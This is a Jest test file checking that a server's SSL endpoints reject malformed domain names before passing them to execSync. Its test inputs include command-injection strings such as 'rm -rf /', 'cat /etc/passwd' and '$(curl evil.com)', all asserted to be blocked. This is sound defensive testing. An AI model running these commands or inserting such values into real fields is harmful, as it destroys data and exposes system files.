'use strict';

/**
 * SSL domain injection prevention tests
 *
 * Tests that the /api/ssl/all endpoint validates every domain against
 * a strict regex before passing it to execSync, preventing command injection
 * via maliciously crafted domain names in config files.
 *
 * Also tests /api/ssl/:domain single-domain validation.
 *
 * Uses inline validation logic (mirroring src/server.js) for reliable,
 * fast tests that don't depend on external network or openssl binary.
 */

// ── Inline domain validation (mirrors src/server.js DOMAIN_RE) ──────────────

const DOMAIN_RE = /^[a-zA-Z0-9][a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;

function validateDomain(domain) {
  return DOMAIN_RE.test(domain);
}

/**
 * Simulate the ssl/all loop filtering: returns 'skipped' for invalid domains,
 * 'checked' for domains that pass validation (would go to execSync).
 */
function processDomain(domain) {
  if (!DOMAIN_RE.test(domain)) return 'skipped';
  return 'checked';
}

// ── DOMAIN_RE validation tests ────────────────────────────────────────────────

describe('SSL domain validation — DOMAIN_RE regex', () => {
  test('1. accepts valid domain example.com', () => {
    expect(validateDomain('example.com')).toBe(true);
  });

  test('2. accepts subdomain api.example.com', () => {
    expect(validateDomain('api.example.com')).toBe(true);
  });

  test('3. accepts domain with hyphens my-service.example.com', () => {
    expect(validateDomain('my-service.example.com')).toBe(true);
  });

  test('4. rejects domain with semicolon injection', () => {
    expect(validateDomain('example.com; rm -rf /')).toBe(false);
  });

  test('5. rejects domain with backtick injection', () => {
    expect(validateDomain('example.com`whoami`')).toBe(false);
  });

  test('6. rejects domain with pipe injection', () => {
    expect(validateDomain('example.com | cat /etc/passwd')).toBe(false);
  });

  test('7. rejects domain with dollar sign injection', () => {
    expect(validateDomain('$(curl evil.com)')).toBe(false);
  });

  test('8. rejects domain with spaces', () => {
    expect(validateDomain('example com')).toBe(false);
  });

  test('9. rejects domain with newline injection', () => {
    expect(validateDomain('example.com\nrm -rf /')).toBe(false);
  });

  test('10. rejects domain starting with dot', () => {
    expect(validateDomain('.example.com')).toBe(false);
  });

  test('11. rejects TLD only (no dot)', () => {
    expect(validateDomain('localhost')).toBe(false);
  });

  test('12. rejects empty string', () => {
    expect(validateDomain('')).toBe(false);
  });

  test('13. rejects domain with single-char TLD', () => {
    expect(validateDomain('example.c')).toBe(false);
  });

  test('14. accepts domain with two-char TLD (example.io)', () => {
    expect(validateDomain('example.io')).toBe(true);
  });
});

// ── ssl/all injection blocking tests ─────────────────────────────────────────

describe('SSL /api/ssl/all — injection blocked via domain filter', () => {
  test('15. malicious domain with semicolon is skipped in bulk check', () => {
    expect(processDomain('example.com; cat /etc/passwd')).toBe('skipped');
  });

  test('16. malicious domain with pipe is skipped in bulk check', () => {
    expect(processDomain('example.com | id')).toBe('skipped');
  });

  test('17. malicious domain with backtick is skipped in bulk check', () => {
    expect(processDomain('evil.com`id`')).toBe('skipped');
  });

  test('18. malicious domain with $() is skipped', () => {
    expect(processDomain('$(curl attacker.com)')).toBe('skipped');
  });

  test('19. valid domain passes through to check', () => {
    expect(processDomain('valid.example.com')).toBe('checked');
  });

  test('20. domain with encoded chars is skipped', () => {
    expect(processDomain('example.com%0a id')).toBe('skipped');
  });

  test('21. domain with quote injection is skipped', () => {
    expect(processDomain('x.com" && id #')).toBe('skipped');
  });

  test('22. wildcard domain is skipped', () => {
    expect(processDomain('*.example.com')).toBe('skipped');
  });
});

// ── HTTP endpoint tests ───────────────────────────────────────────────────────

describe('SSL /api/ssl/:domain — HTTP endpoint rejects bad domains', () => {
  let app;

  beforeAll(() => {
    delete process.env.DASHBOARD_PASSWORD;
    ({ app } = require('../src/server'));
  });

  test('23. GET /api/ssl/example.com returns non-400 (valid domain)', async () => {
    const request = require('supertest');
    const res = await request(app).get('/api/ssl/example.com');
    // May be 500 (openssl not available) but NOT 400 (not rejected as invalid)
    expect(res.status).not.toBe(400);
  });

  test('24. GET /api/ssl/evil%3Bcat encodes to invalid → 400', async () => {
    const request = require('supertest');
    const res = await request(app).get('/api/ssl/evil%3Bcat');
    expect(res.status).toBe(400);
  });
});
